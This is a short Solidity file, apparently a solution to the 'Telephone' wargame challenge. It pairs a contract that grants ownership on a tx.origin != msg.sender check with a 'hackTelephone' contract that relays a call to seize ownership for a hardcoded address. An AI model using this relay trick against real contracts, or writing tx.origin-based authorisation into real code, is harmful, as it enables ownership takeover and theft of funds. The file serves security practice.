/**
 *Submitted for verification at Etherscan.io on 2021-10-10
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;



// Part: TelephoneInterface

contract TelephoneInterface{
    address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

// File: telephone.sol

contract hackTelephone{
    address TelephoneAddress = 0x8755FAea57931aD3eaee5b51e26303E981975Efa;
    address  yo = 0xfFfC97E89f7F3e9F1D8f5E5Bc3D2Ad6Ab9026913;
    TelephoneInterface Interfaz = TelephoneInterface(TelephoneAddress);
    function hack(address _address)public{
        _address = yo;
        Interfaz.changeOwner(_address);
    }
}